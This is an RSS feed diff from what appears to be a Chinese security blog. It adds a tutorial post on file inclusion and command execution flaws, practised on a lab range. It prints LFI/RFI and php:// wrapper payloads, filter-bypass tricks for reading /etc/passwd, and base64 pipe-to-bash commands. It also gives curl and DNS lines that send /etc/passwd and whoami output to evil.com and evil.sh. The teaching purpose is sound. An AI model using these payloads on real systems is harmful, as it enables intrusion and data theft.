@@ -7,7 +7,7 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Fri, 23 Jan 2026 20:44:35 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 24 Jan 2026 20:58:21 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/post/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>恰到好处的补完—《轻音少女》观后感</title>
         <link>https://www.retr0.xyz/p/%E6%81%B0%E5%88%B0%E5%A5%BD%E5%A4%84%E7%9A%84%E8%A1%A5%E5%AE%8C%E8%BD%BB%E9%9F%B3%E5%B0%91%E5%A5%B3%E8%A7%82%E5%90%8E%E6%84%9F/</link>
         <pubDate>Sat, 01 Nov 2025 09:58:38 +0800</pubDate>
@@ -88,6 +88,301 @@
 	
 &gt;&lt;/p&gt;
 &lt;center&gt;最后一次在学园祭上演出完的众人&lt;/center&gt;
+</description>
+        </item>
+        <item>
+        <title>1.24-1 文件包含漏洞和命令执行漏洞</title>
+        <link>https://www.retr0.xyz/p/1.24-1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link>
+        <pubDate>Sat, 24 Jan 2026 20:58:21 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/1.24-1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid>
+        <description>&lt;h2 id=&#34;文件包含漏洞&#34;&gt;文件包含漏洞
+&lt;/h2&gt;&lt;p&gt;搭建靶场所用文件：&lt;a class=&#34;link&#34; href=&#34;https://pan.baidu.com/s/1IoX4I73J5mnD96tzlnV6UQ?pwd=s86q&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://pan.baidu.com/s/1IoX4I73J5mnD96tzlnV6UQ?pwd=s86q&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;这部分在之前的【文件上传】当中已有运用，详情请看&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/1.19-xss-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB2%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;1.19 XSS 注入攻击2与文件上传&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;文件包含在php中有两种写法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;include&lt;/code&gt;	出错但继续&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;require&lt;/code&gt;	出错会停&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;include_once&lt;/code&gt;	相当于include，但会检查确保只包含一次&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;require&lt;/code&gt;		相当于require，但会检查确保只包含一次&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;本地包含local-file-include&#34;&gt;本地包含（Local File Include）
+&lt;/h3&gt;&lt;p&gt;在靶场中选择File Inclusion(local)选择一个选项后用burp抓包可以看见提交的数据包中第一行为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;/vul/fileinclude/fi_local.php?filename=file1.php&amp;amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里作者已经帮我们在网站根目录的test文件夹里放了一个&lt;code&gt;phpinfo.txt&lt;/code&gt;我们需要使用调用它。&lt;/p&gt;
+&lt;p&gt;因为默认情况下这里路径指的是&lt;code&gt;\vul\fileinclude\include&lt;/code&gt;文件夹，所以我们要在路径前面写&lt;code&gt;../&lt;/code&gt;来回退到上一个目录&lt;/p&gt;
+&lt;p&gt;最终的filename是&lt;code&gt;../../../test/phpinfo.txt&lt;/code&gt;使用了三次回退正好回退到了根目录&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注：&lt;/strong&gt; 有些情况下(PHP&amp;lt;5.3.4)filename最后可能需要使用&lt;code&gt;%00&lt;/code&gt;截断&lt;/p&gt;
+&lt;h3 id=&#34;远程包含remote-file-include&#34;&gt;远程包含（Remote File Include）
+&lt;/h3&gt;&lt;p&gt;测试远程文件包含可以用准备好的phpinfo文件：&lt;a class=&#34;link&#34; href=&#34;http://www.retr0.xyz/blog-files/phpinfo.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.retr0.xyz/blog-files/phpinfo.txt&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;同样提交时使用burp抓包，第一行为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;/vul/fileinclude/fi_remote.php?filename=include%2Ffile1.php&amp;amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里比较简单，因为include函数是放在数据包里的，所以我们直接把原本的&lt;code&gt;filename&lt;/code&gt;替换成远程木马的链接就可以了，例如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;filename=http://www.retr0.xyz/blog-files/phpinfo.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;有时&lt;code&gt;http://&lt;/code&gt;协议异常时也可以试试&lt;code&gt;ftp://&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;一般情况下远程文件包含不会像这样简单，因为需要服务端配置了以下环境（php.ini）:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;allow_url_fopen = On&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;allow_url_include = On&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;结合php伪协议&#34;&gt;结合php伪协议
+&lt;/h3&gt;&lt;h4 id=&#34;phpfilter获取源码&#34;&gt;php://filter（获取源码）
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;适用场景&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;include($_GET[&amp;#39;file&amp;#39;]);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;并且：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;allow_url_include&lt;/code&gt; ❌ 无要求&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;php://filter&lt;/code&gt; 默认开启&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;利用方式&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?filename=php://filter/read=convert.base64-encode/resource=index.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;此外也有：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?filename=php://filter/read=string.toupper|string.rot13/resource=index.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;phpinput执行代码&#34;&gt;php://input（执行代码）
+&lt;/h4&gt;&lt;blockquote&gt;
+&lt;p&gt;php://input会让服务端将你传的php代码当作一个临时的php文件运行。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;使用方法：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;向目标参数传入&lt;code&gt;php://input&lt;/code&gt;，如：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://target/vuln.php?filename=php://input
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;同时用POST方式传入你的一句话木马：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php phpinfo(); ?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;phpfile使用绝对路径打开文件&#34;&gt;php://file（使用绝对路径打开文件）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用方法：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;修改目标参数为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;filename=file:绝对路径
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如：&lt;code&gt;filename=file:///etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;或：&lt;code&gt;filename=file:///C:/windows/&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;phpdata直接在url中写php代码&#34;&gt;php://data（直接在URL中写php代码）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用方法：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;修改目标参数为：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;filename-data://text/plain,&amp;lt;?php phpinfo();?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;或者使用base64加密版（不要带加号）&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;命令执行漏洞&#34;&gt;命令执行漏洞
+&lt;/h2&gt;&lt;p&gt;命令执行在之前的&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/1.6-%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;1.6 其他基础web漏洞介绍&lt;/a&gt;有过简单介绍，在这里再来总结补充一下。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;例如一个网页上让你输入一个ip，提交后会返回ping这个ip的结果，那么我们要想这个ping的执行是否是由系统命令直接执行的（cmd或bash），如果是那么如何让它执行别的命令？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;危险函数盘点&#34;&gt;危险函数盘点
+&lt;/h3&gt;&lt;h4 id=&#34;系统命令执行函数&#34;&gt;系统命令执行函数
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;system()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;shell_exec()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;popen()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;exec()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;passthru()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;proc_open()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;反引号 &lt;code&gt;command&lt;/code&gt;（等效于 shell_exec ()）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;代码执行函数&#34;&gt;代码执行函数
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;eval()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;create_function()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;assert()&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;preg_replace (&#39;/e&#39;)&lt;/code&gt;（正则替换 /e 修饰符触发代码执行）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;漏洞模式分类含代码示例&#34;&gt;漏洞模式分类（含代码示例）
+&lt;/h3&gt;&lt;h4 id=&#34;直接执行模式&#34;&gt;直接执行模式
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;核心特征：用户输入直接作为命令执行参数&lt;/li&gt;
+&lt;li&gt;示例代码：&lt;code&gt;system($_GET[&#39;cmd&#39;]);&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;攻击逻辑：输入的 cmd 参数无过滤，直接触发命令执行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;拼接执行模式&#34;&gt;拼接执行模式
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;核心特征：用户输入与固定命令拼接后执行&lt;/li&gt;
+&lt;li&gt;示例代码：&lt;code&gt;$ip = $_GET[&#39;ip&#39;]; system(&amp;quot;ping -c 4 &amp;quot; . $ip);&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;攻击逻辑：通过拼接分隔符（如；、|）注入额外命令&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;动态函数调用模式&#34;&gt;动态函数调用模式
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;核心特征：用户输入作为函数名调用&lt;/li&gt;
+&lt;li&gt;示例代码：&lt;code&gt;$func = $_GET[&#39;func&#39;]; $func();&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;攻击逻辑：输入危险函数名（如 system）触发执行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;命令执行绕过技术&#34;&gt;命令执行绕过技术
+&lt;/h3&gt;&lt;h4 id=&#34;命令分隔符按系统分类&#34;&gt;命令分隔符（按系统分类）
+&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Linux 系统&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;分号 &lt;code&gt;;&lt;/code&gt;：顺序执行多个命令（command1; command2）&lt;/li&gt;
+&lt;li&gt;管道 &lt;code&gt;|&lt;/code&gt;：将前命令结果传递给后命令（command1 | command2）&lt;/li&gt;
+&lt;li&gt;逻辑运算符：
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;：前命令成功则执行后命令（command1 &amp;amp;&amp;amp; command2）&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;||&lt;/code&gt;：前命令失败则执行后命令（command1 || command2）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;后台执行 &lt;code&gt;&amp;amp;&lt;/code&gt;：同时执行多个命令（command1 &amp;amp; command2）&lt;/li&gt;
+&lt;li&gt;换行符 &lt;code&gt;0x0a&lt;/code&gt;：换行分隔命令（command1 0x0a command2）&lt;/li&gt;
+&lt;li&gt;子 shell：&lt;code&gt;$(command1)&lt;/code&gt; 或 &lt;code&gt;\&lt;/code&gt;command1``（执行子 shell 命令）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;&lt;strong&gt;Windows 系统&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;顺序执行 &lt;code&gt;&amp;amp;&lt;/code&gt;：command1 &amp;amp; command2&lt;/li&gt;
+&lt;li&gt;逻辑运算符：&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;（前成功则后执行）、&lt;code&gt;||&lt;/code&gt;（前失败则后执行）&lt;/li&gt;
+&lt;li&gt;管道 &lt;code&gt;|&lt;/code&gt;：command1 | command2&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;空格绕过&#34;&gt;空格绕过
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;$IFS&lt;/code&gt;：&lt;code&gt;cat${IFS}/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;大括号 &lt;code&gt;{}&lt;/code&gt;：&lt;code&gt;{cat,/etc/passwd}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;重定向符号：&lt;code&gt;cat&amp;lt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Hex 编码：&lt;code&gt;X=$&#39;cat\x09/etc/passwd&#39;&amp;amp;&amp;amp;$X&lt;/code&gt;（\x09 为 Tab 字符）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;字符串混淆&#34;&gt;字符串混淆
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;变量拼接：&lt;code&gt;a=c;b=at;c=/etc/passwd;$a$b $c&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;通配符替代：&lt;code&gt;/bin/cat /etc/pass[d]&lt;/code&gt;、&lt;code&gt;/???/c?t /etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;引号混淆：&lt;code&gt;c&#39;a&#39;t&lt;/code&gt;、&lt;code&gt;c&amp;quot;a&amp;quot;t&lt;/code&gt;、&lt;code&gt;c\at&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;特殊符号绕过：&lt;code&gt;l&#39;s&#39;&lt;/code&gt;（绕过 ls 关键词屏蔽）、&lt;code&gt;chmo\d&lt;/code&gt;（绕过 chmod 屏蔽）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;编码绕过&#34;&gt;编码绕过
+&lt;/h3&gt;&lt;h4 id=&#34;base64-编码适用于-waf-拦截关键字&#34;&gt;Base64 编码（适用于 WAF 拦截关键字）
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;示例：将&lt;code&gt;cat /etc/passwd&lt;/code&gt;编码为&lt;code&gt;Y2F0IC9ldGMvcGFzc3dk&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;执行命令：&lt;code&gt;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;hex-编码&#34;&gt;Hex 编码
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;示例：将&lt;code&gt;cat /etc/passwd&lt;/code&gt;编码为&lt;code&gt;636174202f6574632f706173737764&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;执行命令：&lt;code&gt;echo 636174202f6574632f706173737764 | xxd -r -p | bash&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;无回显攻击技术blind-command-execution&#34;&gt;无回显攻击技术（Blind Command Execution）
+&lt;/h3&gt;&lt;h4 id=&#34;dns-外带oob&#34;&gt;DNS 外带（OOB）
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;原理：将命令执行结果作为子域名发送到攻击者 DNS 服务器&lt;/li&gt;
+&lt;li&gt;示例：&lt;code&gt;ping 反引号whoami反引号.evil.sh&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;详见：&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/1.22.sp-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;1.22.SP 奇技淫巧：SQL注入之数据外带&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&#34;http-外带&#34;&gt;HTTP 外带
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;原理：通过 HTTP 请求将结果发送到攻击者服务器&lt;/li&gt;
+&lt;li&gt;示例：&lt;code&gt;curl http://evil.com/$(cat /etc/passwd|base64)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;进阶：带认证 + 数据编码 &lt;code&gt;curl -u user:pass http://evil.com/$(whoami|base64) -d &amp;quot;data=$(cat /etc/passwd|base64)&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;时间盲注&#34;&gt;时间盲注
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;原理：通过命令执行后的延迟判断是否成功&lt;/li&gt;
+&lt;li&gt;示例：&lt;code&gt;sleep 5&lt;/code&gt;（Linux）、&lt;code&gt;ping -c 10 127.0.0.1&lt;/code&gt;（Linux）&lt;/li&gt;
+&lt;/ul&gt;
